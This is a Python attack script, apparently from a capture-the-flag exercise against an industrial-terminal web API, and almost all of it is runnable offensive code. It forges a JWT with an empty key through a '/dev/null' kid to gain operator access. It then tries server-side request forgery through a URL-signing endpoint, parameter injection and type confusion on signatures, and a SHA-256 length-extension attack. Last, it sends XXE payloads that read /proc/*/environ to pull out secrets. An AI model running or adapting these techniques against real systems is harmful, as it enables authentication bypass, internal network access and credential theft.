#!/usr/bin/env python3
"""round61 — Probe sign endpoint abuse: custom URL signing, POST method, parameter injection"""
import requests, time, json, hmac as hm, hashlib, base64, struct

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"
P9000 = f"http://{HOST}:9000"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

KNOWN_URL = "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
KNOWN_SIG = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

# ============================================================
print("="*70)
print("PHASE 1: PROBE/SIGN — POST METHOD WITH CUSTOM URL")
print("="*70)

# Test 1: POST to probe/sign with custom URL
custom_urls = [
    "http://localhost:9000/",
    "http://localhost:9000/healthz",
    "http://localhost:9000/shell",
    "http://localhost:9000/llehs",
    "http://127.0.0.1:9000/",
    "http://localhost:3000/",
    "http://gauge-gw.internal:9100/",
    "http://gauge-gw.internal:9100/secret",
    "http://gauge-gw.internal:9100/flag",
    "http://gauge-gw.internal:9100/v1/config",
    "http://gauge-gw.internal:9100/v1/secret",
    "http://gauge-gw.internal:9100/v1/admin",
    "http://gauge-gw.internal:9100/probe_secret",
    "http://terminal-db:5432/",
]

for url in custom_urls:
    # POST JSON
    try:
        r = S.post(f"{CASPI}/api/ops/probe/sign",
                   json={"url": url},
                   headers={**AUTH_OP, "Content-Type":"application/json"}, timeout=5)
        if r.status_code != 404 and r.status_code != 405:
            print(f"  [POST json url] [{r.status_code}] url={url[:50]}: {r.text[:200]}")
            if r.status_code == 200:
                data = r.json()
                sig = data.get("sig", "")
                if sig:
                    print(f"  *** GOT SIGNATURE: {sig} ***")
                    # Immediately use it to probe!
                    pr = S.post(f"{CASPI}/api/ops/probe",
                                json={"url": url, "sig": sig},
                                headers=AUTH_OP, timeout=10)
                    print(f"  *** PROBE RESULT [{pr.status_code}]: {pr.text[:300]} ***")
    except Exception as e:
        if "timed out" not in str(e):
            print(f"  [POST json url] Error: {e}")

    # POST with device + url override
    try:
        r = S.post(f"{CASPI}/api/ops/probe/sign",
                   json={"device": "lm-01", "url": url},
                   headers={**AUTH_OP, "Content-Type":"application/json"}, timeout=5)
        if r.status_code == 200:
            data = r.json()
            actual_url = data.get("url", "")
            sig = data.get("sig", "")
            if actual_url != KNOWN_URL:
                print(f"  *** URL OVERRIDE WORKED: {actual_url} sig={sig} ***")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: PROBE/SIGN — URL PARAMETER INJECTION")
print("="*70)

# GET with both device and url params
for url in ["http://localhost:9000/", "http://localhost:9000/healthz"]:
    try:
        r = S.get(f"{CASPI}/api/ops/probe/sign",
                  params={"device": "lm-01", "url": url},
                  headers=AUTH_OP, timeout=5)
        if r.status_code == 200:
            data = r.json()
            actual_url = data.get("url", "")
            sig = data.get("sig", "")
            if actual_url != KNOWN_URL:
                print(f"  *** URL OVERRIDE via GET param: {actual_url} ***")
            else:
                print(f"  GET device+url: url not overridden")
    except:
        pass

# URL injection in device parameter
injection_devices = [
    "lm-01&url=http://localhost:9000/",
    "lm-01%26url=http://localhost:9000/",
    "lm-01?url=http://localhost:9000/",
]
for dev in injection_devices:
    try:
        r = S.get(f"{CASPI}/api/ops/probe/sign",
                  params={"device": dev},
                  headers=AUTH_OP, timeout=5)
        if r.status_code == 200:
            data = r.json()
            print(f"  device={dev!r}: url={data.get('url','')[:60]} sig={data.get('sig','')[:20]}")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: PROBE POST — DIFFERENT CONTENT TYPES")
print("="*70)

target_url = "http://localhost:9000/healthz"

# Form data
try:
    r = S.post(f"{CASPI}/api/ops/probe",
               data={"url": target_url, "sig": "any"},
               headers={**AUTH_OP, "Content-Type":"application/x-www-form-urlencoded"}, timeout=5)
    print(f"  [form-data] [{r.status_code}]: {r.text[:200]}")
except Exception as e:
    print(f"  [form-data] Error: {e}")

# XML
try:
    xml = f'<probe><url>{target_url}</url><sig>any</sig></probe>'
    r = S.post(f"{CASPI}/api/ops/probe",
               data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=5)
    print(f"  [xml] [{r.status_code}]: {r.text[:200]}")
except Exception as e:
    print(f"  [xml] Error: {e}")

# No sig at all
try:
    r = S.post(f"{CASPI}/api/ops/probe",
               json={"url": KNOWN_URL},
               headers=AUTH_OP, timeout=5)
    print(f"  [no sig] [{r.status_code}]: {r.text[:200]}")
except Exception as e:
    print(f"  [no sig] Error: {e}")

# Empty sig
try:
    r = S.post(f"{CASPI}/api/ops/probe",
               json={"url": KNOWN_URL, "sig": ""},
               headers=AUTH_OP, timeout=5)
    print(f"  [empty sig] [{r.status_code}]: {r.text[:200]}")
except Exception as e:
    print(f"  [empty sig] Error: {e}")

# Sig as None/null
try:
    r = S.post(f"{CASPI}/api/ops/probe",
               json={"url": KNOWN_URL, "sig": None},
               headers=AUTH_OP, timeout=5)
    print(f"  [null sig] [{r.status_code}]: {r.text[:200]}")
except Exception as e:
    print(f"  [null sig] Error: {e}")

# Sig as array
try:
    r = S.post(f"{CASPI}/api/ops/probe",
               json={"url": KNOWN_URL, "sig": [KNOWN_SIG]},
               headers=AUTH_OP, timeout=5)
    print(f"  [array sig] [{r.status_code}]: {r.text[:200]}")
except Exception as e:
    print(f"  [array sig] Error: {e}")

# Sig as integer
try:
    r = S.post(f"{CASPI}/api/ops/probe",
               json={"url": KNOWN_URL, "sig": 0},
               headers=AUTH_OP, timeout=5)
    print(f"  [int sig=0] [{r.status_code}]: {r.text[:200]}")
except Exception as e:
    print(f"  [int sig=0] Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: HASH LENGTH EXTENSION ATTACK TEST")
print("="*70)

# If signature is SHA256(key + url) instead of HMAC, length extension works
# We need to test if the server accepts extended signatures

# SHA256 block size = 64 bytes
# For SHA256(key + message), the padding after the message is:
# 0x80 + zeros + big-endian 64-bit length of (key+message) in bits

def sha256_padding(msg_len):
    """Generate SHA-256 padding for a message of given byte length"""
    bit_len = msg_len * 8
    padding = b'\x80'
    padding += b'\x00' * ((55 - msg_len) % 64)
    padding += struct.pack('>Q', bit_len)
    return padding

def sha256_extend(original_hash, extension, original_data_len):
    """Compute SHA256(original_data + padding + extension) given SHA256(original_data)"""
    # Parse the original hash into SHA-256 state
    state = struct.unpack('>8I', bytes.fromhex(original_hash))

    # Create a new SHA256 with the forged state
    # Python's hashlib doesn't expose this, so we implement manually

    # We need a SHA256 implementation that allows setting initial state
    # Using ctypes to modify hashlib's internal state
    import ctypes

    h = hashlib.sha256()

    # The internal state structure varies by Python version
    # Try to set the state directly
    # This is hacky but works for CPython

    # Get the padding
    padding = sha256_padding(original_data_len)

    # The total length after padding
    padded_len = original_data_len + len(padding)

    # For the extension, we need to hash:
    # SHA256_init_with_state(state, padded_len).update(extension).hexdigest()

    # Since we can't easily modify hashlib state, let's try a different approach
    # Use the hashpumpy or hlextend library if available
    try:
        import hashpumpy
        new_hash, new_msg = hashpumpy.hashpump(
            original_hash,
            KNOWN_URL,  # original message (without key)
            extension,
            original_data_len - len(KNOWN_URL)  # key length
        )
        return new_hash, new_msg
    except ImportError:
        pass

    try:
        import hlextend
        sha = hlextend.new('sha256')
        new_msg = sha.extend(extension, KNOWN_URL,
                            original_data_len - len(KNOWN_URL),
                            original_hash)
        new_hash = sha.hexdigest()
        return new_hash, new_msg
    except ImportError:
        pass

    return None, None

# Test with different key lengths
extension = b"&x=1"  # Simple extension

print("  Testing SHA256 length extension...")
print("  (Requires hashpumpy or hlextend library)")

for key_len in range(1, 65):
    try:
        result = sha256_extend(KNOWN_SIG, extension.decode(), key_len + len(KNOWN_URL))
        if result[0] is None:
            print("  hashpumpy/hlextend not available, trying manual implementation...")
            break

        new_hash, new_msg = result
        # Convert new_msg to string URL
        if isinstance(new_msg, bytes):
            new_url = new_msg.decode('latin-1')
        else:
            new_url = new_msg

        # Test against the probe endpoint
        r = S.post(f"{CASPI}/api/ops/probe",
                   json={"url": new_url, "sig": new_hash},
                   headers=AUTH_OP, timeout=5)

        if r.status_code == 200:
            print(f"  *** LENGTH EXTENSION WORKS! key_len={key_len} ***")
            print(f"  *** New URL: {new_url[:100]} ***")
            print(f"  *** New sig: {new_hash} ***")
            print(f"  *** Response: {r.text[:300]} ***")
            break
        elif r.status_code != 403:
            print(f"  key_len={key_len}: [{r.status_code}] {r.text[:100]}")
    except Exception as e:
        if "timed out" not in str(e) and "hashpumpy" not in str(e):
            print(f"  key_len={key_len}: {str(e)[:100]}")
        break

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: PROBE — VERIFIED URL DESTINATIONS")
print("="*70)

# We already have valid signatures for 5 URLs to gauge-gw
# Let's try to enumerate gauge-gw endpoints by modifying query/fragment
# The signed URL is exact, but what about adding query params or fragments?

for device, (url, sig) in [
    ("lm-01", (KNOWN_URL, KNOWN_SIG)),
]:
    # Original URL works. Now try variations:
    variations = [
        (url + "?", sig),  # trailing ?
        (url + "#", sig),  # trailing #
        (url + "/", sig),  # trailing /
        (url + "%00", sig), # null byte
        (url + "%0a", sig), # newline
        (url + "?cmd=id", sig),
        (url + "#secret", sig),
        # URL with same path but different sig (test sig validation)
    ]

    for vurl, vsig in variations:
        try:
            r = S.post(f"{CASPI}/api/ops/probe",
                       json={"url": vurl, "sig": vsig},
                       headers=AUTH_OP, timeout=5)
            if r.status_code == 200:
                body = r.json().get("body", "")
                if body != '{"flow_m3h":' and "flow_m3h" not in str(body):
                    print(f"  *** DIFFERENT RESPONSE for {vurl[-30:]}: {body[:200]} ***")
                else:
                    pass  # Same response, URL variation not significant
            elif r.status_code != 403:
                print(f"  [{r.status_code}] {vurl[-40:]}: {r.text[:100]}")
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: PROBE/SIGN — ALL HTTP METHODS")
print("="*70)

for method_name, method in [("GET", S.get), ("POST", S.post),
                             ("PUT", S.put), ("DELETE", S.delete),
                             ("PATCH", S.patch), ("OPTIONS", S.options)]:
    try:
        kwargs = {"headers": AUTH_OP, "timeout": 5}
        if method_name in ["POST", "PUT", "PATCH"]:
            kwargs["json"] = {"url": "http://localhost:9000/healthz"}
        if method_name == "GET":
            r = method(f"{CASPI}/api/ops/probe/sign?device=lm-01", **kwargs)
        else:
            r = method(f"{CASPI}/api/ops/probe/sign", **kwargs)

        if r.status_code not in [404, 405]:
            print(f"  [{method_name}] [{r.status_code}]: {r.text[:200]}")
    except Exception as e:
        if "timed out" not in str(e):
            print(f"  [{method_name}] Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: DIRECT PROBE TO OTHER NETWORK HOSTS")
print("="*70)

# gauge-gw.internal resolves to some IP. Let's probe other internal hosts
# Using VALID sig for known URL — the response shows what gauge-gw returns
# But also check: what if gauge-gw IS one of the hosts we found?

# Check if any CTF hosts respond like gauge-gw
for ip in ["192.168.242.101", "192.168.242.103", "192.168.242.104", "192.168.242.106"]:
    try:
        test_url = f"http://{ip}:9100/v1/meters/loading-arm-1/flow"
        r = requests.get(test_url, timeout=3)
        print(f"  {ip}:9100 [{r.status_code}]: {r.text[:200]}")
    except Exception as e:
        print(f"  {ip}:9100: {str(e)[:60]}")

# Also check port 9100 on our target
try:
    r = requests.get(f"http://{HOST}:9100/v1/meters/loading-arm-1/flow", timeout=3)
    print(f"  {HOST}:9100 [{r.status_code}]: {r.text[:200]}")
except Exception as e:
    print(f"  {HOST}:9100: {str(e)[:60]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: XXE — READ /proc/self/environ INDIVIDUAL VARS")
print("="*70)

# /proc/self/environ has null bytes BETWEEN vars but not WITHIN vars
# What if we can read it using a different technique?

# Technique: Read via /proc/PID/environ for each worker
for pid in [1, 11, 12, 13, 14, 2017]:
    path = f"/proc/{pid}/environ"
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>&x;</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=5)
        if r.status_code == 200:
            data = r.json()
            val = data.get("summary", {}).get("remarks", "") or data.get("ticket", {}).get("remarks", "")
            if val and val not in ["R", ""]:
                print(f"  *** PID {pid} environ: {val[:300]} ***")
        elif r.status_code == 400:
            print(f"  PID {pid}: exists but unreadable (null bytes)")
        else:
            print(f"  PID {pid}: [{r.status_code}]")
    except:
        pass

# Also try /proc/self/environ with XML 1.1
xml11 = f'''<?xml version="1.1" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file:///proc/self/environ">]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>&x;</remarks>
</ticket>'''
try:
    r = S.post(f"{CASPI}/api/ops/custody/ingest",
        data=xml11, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=5)
    print(f"  XML 1.1 /proc/self/environ: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    print(f"  XML 1.1 error: {e}")

print("\n"+"="*70)
print("DONE")
print("="*70)
